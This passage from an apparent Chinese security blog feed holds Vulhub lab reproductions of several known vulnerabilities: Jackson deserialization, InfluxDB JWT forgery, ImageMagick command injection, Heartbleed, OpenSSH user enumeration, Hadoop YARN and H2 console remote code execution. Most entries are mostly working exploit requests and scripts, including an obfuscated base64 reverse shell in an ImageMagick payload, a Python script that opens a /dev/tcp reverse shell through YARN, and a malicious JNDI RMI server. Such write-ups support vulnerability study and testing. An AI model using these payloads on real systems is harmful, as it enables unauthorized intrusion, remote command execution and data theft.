;&#x3D;&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;transletName&quot;: &quot;a.b&quot;,</span><br><span class="line">      &quot;outputProperties&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210816/16291059681343.png" alt="image-20210816144118603"></p>
<p>成功在<code>/tmp</code>中创建<code>prove1.txt</code></p>
<p><img src="https://image.3001.net/images/20210816/16291059717590.png" alt="image-20210816151150620"></p>
<p>这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。</p>
<h3 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h3><p>CVE-2017-7525 <a href="https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1" target="_blank" rel="noopener">黑名单修复</a> 绕过，利用了 <code>org.springframework.context.support.FileSystemXmlApplicationContext</code>。</p>
<p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如<code>http://evil/spel.xml</code>，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/prove2.txt<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"any"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exploit HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;192.168.44.132&#x2F;spel.xml&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行<code>touch /tmp/prove2.txt</code>：</p>
<p><img src="https://image.3001.net/images/20210816/16291059748007.png" alt="image-20210816151311884"></p>
<p><strong>原理：</strong> 利用 <code>FileSystemXmlApplicationContext</code> 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 <code>start()</code> 方法实现命令执行</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">JacksonPolymorphicDeserialization</a></li>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/" target="_blank" rel="noopener">Exploiting the Jackson RCE: CVE-2017-7525</a></li>
<li><a href="https://github.com/irsl/jackson-rce-via-spel" target="_blank" rel="noopener">jackson-rce-via-spel</a></li>
<li><a href="https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1" target="_blank" rel="noopener">Jackson Deserializer security vulnerability</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>influxdb未授权访问漏洞</title>
    <url>/2021/08/16/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="influxdb未授权访问漏洞"><a href="#influxdb未授权访问漏洞" class="headerlink" title="influxdb未授权访问漏洞"></a>influxdb未授权访问漏洞</h1><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数<code>shared-secret</code>的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></li>
<li><a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings" target="_blank" rel="noopener">https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p>
<p><img src="https://image.3001.net/images/20210816/16290852134513.png" alt="image-20210816110138116"></p>
<p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。</p>
<p>最终生成的token：</p>
<p><img src="https://image.3001.net/images/20210816/16290852174825.png" alt="image-20210816110703250"></p>
<p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;query HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjI5MTY5NTg4fQ.pSTpKw7rLIrn5Q5Lw-bFsYlSsR0Eq3hr7v-Ur0jpIg0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">db&#x3D;sample&amp;q&#x3D;show+users</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210816/16290852212869.png" alt="image-20210816110858318"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>influxdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Imagemagick 命令注入漏洞 (CVE-2016–3714)</title>
    <url>/2021/08/13/Imagemagick%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2016%E2%80%933714)/</url>
    <content><![CDATA[<h1 id="Imagemagick-命令注入漏洞-CVE-2016–3714"><a href="#Imagemagick-命令注入漏洞-CVE-2016–3714" class="headerlink" title="Imagemagick 命令注入漏洞 (CVE-2016–3714)"></a>Imagemagick 命令注入漏洞 (CVE-2016–3714)</h1><p>ImageMagick 是一个免费的开源跨平台软件套件，用于显示、创建、转换、修改和编辑光栅图像。</p>
<p>推荐人：</p>
<ul>
<li><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></li>
<li><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">https://github.com/ImageTragick/PoCs</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:8080/</code>以查看上传组件。</p>
<p>发送以下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarymdcbmdQR1sDse9Et</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarymdcbmdQR1sDse9Et</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_upload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|curl &quot;192.168.44.1:8889)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">------WebKitFormBoundarymdcbmdQR1sDse9Et--</span><br></pre></td></tr></table></figure>

<p>可以看到<code>192.168.44.1:8889</code>已经收到http请求，curl命令执行成功后：</p>
<p><img src="https://image.3001.net/images/20210813/16288467309283.png" alt="image-20210813161639851"></p>
<p>获取反向shell的POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;192.168.44.132&#x2F;oops.jpg?&#96;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDQuMS84ODg5IDA+JjE&#x3D; | base64 -d | bash&#96;&quot;||id &quot; )&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210813/16288467343525.png" alt="image-20210813164511755"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ImageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)</title>
    <url>/2021/08/13/%E9%80%9A%E8%BF%87%20PDF%20%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%20ImageMagick%20Shell%20%E6%B3%A8%E5%85%A5%20(CVE-2020-29599)/</url>
    <content><![CDATA[<h1 id="通过-PDF-密码进行-ImageMagick-Shell-注入-CVE-2020-29599"><a href="#通过-PDF-密码进行-ImageMagick-Shell-注入-CVE-2020-29599" class="headerlink" title="通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)"></a>通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)</h1><p>ImageMagick 是一个免费的开源跨平台软件套件，用于显示、创建、转换、修改和编辑光栅图像。</p>
<p>参考：</p>
<ul>
<li><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令进入安装Imagemagick 7.0.10-36的Linux shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose run im bash</span><br></pre></td></tr></table></figure>

<p>进入<code>/tmp</code>目录，转换<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2020-29599/poc.svg" target="_blank" rel="noopener">poc.svg</a>格式，触发漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@f200ec9e1c1e:&#x2F;# cd &#x2F;tmp&#x2F;</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# ls</span><br><span class="line">poc.svg</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# identify poc.svg</span><br><span class="line">poc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.003</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# convert poc.svg poc.png</span><br><span class="line">sh: 1: : Permission denied</span><br><span class="line">convert: MagickCore&#x2F;image.c:1168: DestroyImage: Assertion &#96;image !&#x3D; (Image *) NULL&#39; failed.</span><br><span class="line">Aborted</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# ls</span><br><span class="line">0wned  poc.svg</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp#</span><br></pre></td></tr></table></figure>

<p>命令<code>echo $(id)&gt; ./0wned</code>已成功执行：</p>
<p><img src="https://image.3001.net/images/20210813/16288467562185.png" alt="image-20210813172351545"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ImageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)</title>
    <url>/2021/08/13/OpenSSL%20Heartbleed%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20(CVE-2014-0160)/</url>
    <content><![CDATA[<h1 id="OpenSSL-Heartbleed心脏滴血漏洞-CVE-2014-0160"><a href="#OpenSSL-Heartbleed心脏滴血漏洞-CVE-2014-0160" class="headerlink" title="OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)"></a>OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)</h1><p>Heartbleed Bug 是流行的 OpenSSL 加密软件库中的一个严重漏洞。这个弱点允许窃取在正常情况下由用于保护 Internet 的 SSL/TLS 加密保护的信息。SSL/TLS 为 Web、电子邮件、即时消息 (IM) 和某些虚拟专用网络 (VPN) 等应用程序提供 Internet 上的通信安全和隐私。</p>
<p>Heartbleed 漏洞允许 Internet 上的任何人读取受 OpenSSL 软件易受攻击版本保护的系统的内存。这会破坏用于识别服务提供商和加密流量、用户名称和密码以及实际内容的密钥。这允许攻击者窃听通信、直接从服务和用户窃取数据并冒充服务和用户。</p>
<p>参考：</p>
<ul>
<li><a href="https://heartbleed.com/" target="_blank" rel="noopener">https://heartbleed.com/</a></li>
<li><a href="https://filippo.io/Heartbleed" target="_blank" rel="noopener">https://filippo.io/Heartbleed</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>https://filippo.io/Heartbleed</code>查看结果：</p>
<p><img src="https://image.3001.net/images/20210813/16288382279998.png" alt="image-20210813104441705"></p>
<p>用 Python运行<a href="https://github.com/vulhub/vulhub/blob/master/openssl/heartbleed/ssltest.py" target="_blank" rel="noopener">ssltest.py</a>获取敏感数据（Cookie）：</p>
<p><img src="https://image.3001.net/images/20210813/16288382309994.png" alt="image-20210813105633858"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</title>
    <url>/2021/08/11/OpenSSH%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-15473%EF%BC%89/</url>
    <content><![CDATA[<h1 id="OpenSSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#OpenSSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="OpenSSH 用户名枚举漏洞（CVE-2018-15473）"></a>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</h1><p>OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</p>
<p>参考链接：</p>
<ul>
<li><a href="http://openwall.com/lists/oss-security/2018/08/15/5" target="_blank" rel="noopener">http://openwall.com/lists/oss-security/2018/08/15/5</a></li>
<li><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></li>
<li><a href="https://www.anquanke.com/post/id/157607" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157607</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，我们在客户端执行<code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.44.132 -p20022</code>，输入密码<code>vulhub</code>，即可登录到容器中。</p>
<p><img src="https://image.3001.net/images/20210811/16286741975302.png" alt="image-20210811163607264"></p>
<p>使用<a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">CVE-2018-15473-Exploit</a>，枚举字典中的用户名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt 192.168.44.132</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210811/16286742008682.png" alt="image-20210811171157046"></p>
<p>可见，<code>root</code>是存在的用户，<code>rootInvalid</code>是不存在的用户。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>OpenSSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop YARN ResourceManager 未授权访问</title>
    <url>/2021/08/11/Hadoop%20YARN%20ResourceManager%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a>Hadoop YARN ResourceManager 未授权访问</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考 [<a href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf]" target="_blank" rel="noopener">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf]</a>(<a href="http://archive.hack.lu/2016/Wavestone" target="_blank" rel="noopener">http://archive.hack.lu/2016/Wavestone</a> - Hack.lu 2016 - Hadoop safari - Hunting for vulnerabilities - v1.0.pdf)</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8088</code>即可看到Hadoop YARN ResourceManager WebUI页面。</p>
<p><img src="https://image.3001.net/images/20210811/16286707712132.png" alt="image-20210811153137527"></p>
<p>通过REST API提交任务执行<br>申请新的application：<code>http://192.168.44.132:8088/ws/v1/cluster/apps/new-application</code></p>
<p><img src="https://image.3001.net/images/20210811/16286707746313.png" alt="image-20210811153155733"></p>
<p>更多的提交方法可参考：</p>
<blockquote>
<p><a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html</a></p>
</blockquote>
<p>本地监听9999端口，等待反弹shell连接</p>
<p>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;192.168.44.1&#39; # put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;get-shell&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br></pre></td></tr></table></figure>

<p>然后运行exp脚本，反弹shell，成功获取shell</p>
<p><img src="https://image.3001.net/images/20210811/16286707779266.png" alt="image-20210811153733797"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>H2 数据库 Web 控制台未授权访问</title>
    <url>/2021/08/10/H2%20%E6%95%B0%E6%8D%AE%E5%BA%93%20Web%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="H2-数据库-Web-控制台未授权访问"><a href="#H2-数据库-Web-控制台未授权访问" class="headerlink" title="H2 数据库 Web 控制台未授权访问"></a>H2 数据库 Web 控制台未授权访问</h1><p>H2 数据库是 Java 中的嵌入式内存数据库。带有 h2 数据库的 Springboot 带有一个 web 管理页面，如果您设置以下选项，则该页面没有身份验证：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.h2.console.enabled&#x3D;true</span><br><span class="line">spring.h2.console.settings.web-allow-others&#x3D;true</span><br></pre></td></tr></table></figure>

<p>该管理页面支持使用JNDI加载JDBC驱动，可以通过远程类加载实现远程代码执行。</p>
<p>参考：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动容器后，spring-boot正在监听<code>http://192.168.44.132:8080</code>，管理页面<code>http://192.168.44.132:8080/h2-console/</code>默认。</p>
<p>参考*<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">在 Java 中利用 JNDI 注入</a>*，我们应该在 Java 8u191 之后使用<code>org.apache.naming.factory.BeanFactory</code>和<code>javax.el.ELProcessor</code>启动外部进程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating evil RMI registry on port 1097"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span>));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需使用此工具*<a href="https://github.com/JosephTribbianni/JNDI" target="_blank" rel="noopener">JNDI</a>*即可利用该漏洞。首先，在<code>config.properties</code>将目标命令设置为<code>touch /tmp/success</code>：</p>
<p><img src="https://image.3001.net/images/20210811/16286706951556.png" alt="image-20210811144412433"></p>
<p>然后开始<code>JNDI-1.0-all.jar</code>，就是会听<code>0.0.0.0:23456</code>。根据以下信息填写表格：</p>
<p><img src="https://image.3001.net/images/20210811/1628670698724.png" alt="image-20210811145426248"></p>
<p><code>javax.naming.InitialContext</code>是 JNDI 工厂类名，URL<code>rmi://evil:23456/BypassByEL</code>是恶意的 RMI 地址。</p>
<p>Evil RMI 服务器收到请求：</p>
<p><img src="https://image.3001.net/images/20210811/16286707012128.png" alt="image-20210811150116259"></p>
<p><code>touch /tmp/success</code> 已经成功执行：</p>
<p><img src="https://image.3001.net/images/20210811/16286707054100.png" alt="image-20210811150130834"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Gogs 任意用户登录漏洞（CVE-2018-18925）</title>
    <url>/2021/08/05/Gogs%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18925%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）</h1><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p>
